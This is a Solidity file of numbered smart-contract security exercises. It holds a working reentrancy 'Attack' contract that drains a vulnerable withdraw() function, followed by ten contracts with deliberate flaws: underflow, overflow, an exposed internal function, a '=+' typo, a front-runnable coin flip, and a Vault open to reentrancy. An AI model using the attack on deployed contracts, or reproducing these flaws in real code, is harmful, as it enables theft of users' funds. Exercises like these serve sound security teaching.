pragma solidity 0.4.23;

contract Vulnerablitity {
    function getBalance(address _account) public view returns (uint256) {
        return address(_account).balance;
    }
    
    function() external payable {}
    
    function withdraw() public returns (bool) {
        return msg.sender.call.value(1e18)();   
    }
}

contract Attack {
    Vulnerablitity v;
    constructor(address _contractAddr) public {
        v = Vulnerablitity(_contractAddr);
    }
    
    function attackContract() public {
        v.withdraw();
    }
    
    function() external payable {
        v.withdraw();
    }
}

//*** Exercice 2 ***//
contract SimpleToken{
    mapping(address => uint) public balances;
    
    function buyToken() payable {
        balances[msg.sender] += msg.value / 1 ether;
    }

    function sendToken(address _recipient, uint _amount) {
        require(balances[msg.sender]!=0); // You must have some tokens.
        
        balances[msg.sender]-=_amount;
        balances[_recipient]+=_amount;
    }  
}

//*** Exercice 3 ***//
contract VoteTwoChoices{
    mapping(address => uint) public votingRights;
    mapping(address => uint) public votesCast;
    mapping(bytes32 => uint) public votesReceived;
    
    function buyVotingRights() payable {
        votingRights[msg.sender]+=msg.value/(1 ether);
    }
    
    function vote(uint _nbVotes, bytes32 _proposition) {
        require(_nbVotes + votesCast[msg.sender]<=votingRights[msg.sender]); // Check you have enough voting rights.
        
        votesCast[msg.sender]+=_nbVotes;
        votesReceived[_proposition]+=_nbVotes;
    }
}

//*** Exercice 4 ***//
contract BuyToken {
    mapping(address => uint) public balances;
    uint public price=1;
    address public owner=msg.sender;
    
    function buyToken(uint _amount, uint _price) payable {
        require(_price>=price);
        require(_price * _amount * 1 ether <= msg.value);
        balances[msg.sender]+=_amount;
    }
    
    function setPrice(uint _price) {
        require(msg.sender==owner);
        
        price=_price;
    }
}

//*** Exercice 5 ***//
contract CountContribution{
    mapping(address => uint) public contribution;
    uint public totalContributions;
    address owner = msg.sender;
    
    function CountContribution() public {
        recordContribution(owner, 1 ether);
    }
    
    function contribute() public payable {
        recordContribution(msg.sender, msg.value);
    }
    
    /** @dev Record a contribution. To be called by CountContribution and contribute.
     *  @param _user The user who contributed.
     *  @param _amount The amount of the contribution.
     */
    function recordContribution(address _user, uint _amount) {
        contribution[_user] += _amount;
        totalContributions += _amount;
    }
}

//*** Exercice 6 ***//
contract Store {
    struct Safe {
        address owner;
        uint amount;
    }
    
    Safe[] public safes;
    
    function store() public payable {
        safes.push(Safe({owner: msg.sender, amount: msg.value}));
    }
    
    /// @dev Take back all the amount stored.
    function take() public {
        for (uint i; i<safes.length; ++i) {
            Safe storage safe = safes[i];
            if (safe.owner==msg.sender && safe.amount!=0) {
                msg.sender.transfer(safe.amount);
                safe.amount=0;
            }
        }
    }
}

//*** Exercice 7 ***//
contract Token {
    mapping(address => uint) public balances;
    
    /// @dev Buy token at the price of 1ETH/token.
    function buyToken() payable {
        balances[msg.sender]+=msg.value / 1 ether;
    }
    
    /** @dev Send token.
     *  @param _recipient The recipient.
     *  @param _amount The amount to send.
     */
    function sendToken(address _recipient, uint _amount) {
        require(balances[msg.sender]>=_amount); // You must have some tokens.
        
        balances[msg.sender]-=_amount;
        balances[_recipient]+=_amount;
    }
    
    /** @dev Send all tokens.
     *  @param _recipient The recipient.
     */
    function sendAllTokens(address _recipient) {
        balances[_recipient]=+balances[msg.sender];
        balances[msg.sender]=0;
    }  
}

//*** Exercice 8 ***//
contract DiscountedBuy {
    uint public basePrice = 1 ether;
    mapping (address => uint) public objectBought;

    /// @dev Buy an object.
    function buy() payable {
        require(msg.value * (1 + objectBought[msg.sender]) == basePrice);
        objectBought[msg.sender]+=1;
    }
    
    /** @dev Return the price you'll need to pay.
     *  @return price The amount you need to pay in wei.
     */
    function price() constant returns(uint price) {
        return basePrice/(1 + objectBought[msg.sender]);
    }   
}

//*** Exercice 9 ***//
contract HeadOrTail {
    bool public chosen;         // True if head/tail has been chosen.
    bool lastChoiceHead;        // True if the choice is head.
    address public lastParty;   // The last party who chose.
    
    /** @dev Must be sent 1 ETH.
     *  Choose head or tail to be guessed by the other player.
     *  @param _chooseHead True if head was chosen, false if tail was chosen.
     */
    function choose(bool _chooseHead) payable {
        require(!chosen);
        require(msg.value == 1 ether);
        
        chosen=true;
        lastChoiceHead=_chooseHead;
        lastParty=msg.sender;
    }
    
    function guess(bool _guessHead) payable {
        require(chosen);
        require(msg.value == 1 ether);
        
        if (_guessHead == lastChoiceHead)
            msg.sender.transfer(2 ether);
        else
            lastParty.transfer(2 ether);
            
        chosen=false;
    }
}

//*** Exercice 10 ***//
contract HeadTail {
    address public partyA;
    address public partyB;
    bytes32 public commitmentA;
    bool public chooseHeadB;
    uint public timeB;
    
    /** @dev Constructor, commit head or tail.
     *  @param _commitmentA is keccak256(chooseHead,randomNumber);
     */
    function HeadTail(bytes32 _commitmentA) payable {
        require(msg.value == 1 ether);
        
        commitmentA=_commitmentA;
        partyA=msg.sender;
    }
    
    /** @dev Guess the choice of party A.
     *  @param _chooseHead True if the guess is head, false otherwize.
     */
    function guess(bool _chooseHead) payable {
        require(msg.value == 1 ether);
        require(partyB==address(0));
        
        chooseHeadB=_chooseHead;
        timeB=now;
        partyB=msg.sender;
    }
    
    /** @dev Reveal the commited value and send ETH to the winner.
     *  @param _chooseHead True if head was chosen.
     *  @param _randomNumber The random number chosen to obfuscate the commitment.
     */
    function resolve(bool _chooseHead, uint _randomNumber) {
        require(msg.sender == partyA);
        require(keccak256(_chooseHead, _randomNumber) == commitmentA);
        require(this.balance >= 2 ether);
        
        if (_chooseHead == chooseHeadB)
            partyB.transfer(2 ether);
        else
            partyA.transfer(2 ether);
    }
    
    /** @dev Time out party A if it takes more than 1 day to reveal.
     *  Send ETH to party B.
     * */
    function timeOut() {
        require(now > timeB + 1 days);
        require(this.balance>=2 ether);
        partyB.transfer(2 ether);
    }
}

//*** Exercice 11 ***//
contract Vault {
    mapping(address => uint) public balances;

    /// @dev Store ETH in the contract.
    function store() payable {
        balances[msg.sender]+=msg.value;
    }
    
    /// @dev Redeem your ETH.
    function redeem() {
        msg.sender.call.value(balances[msg.sender])();
        balances[msg.sender]=0;
    }
}
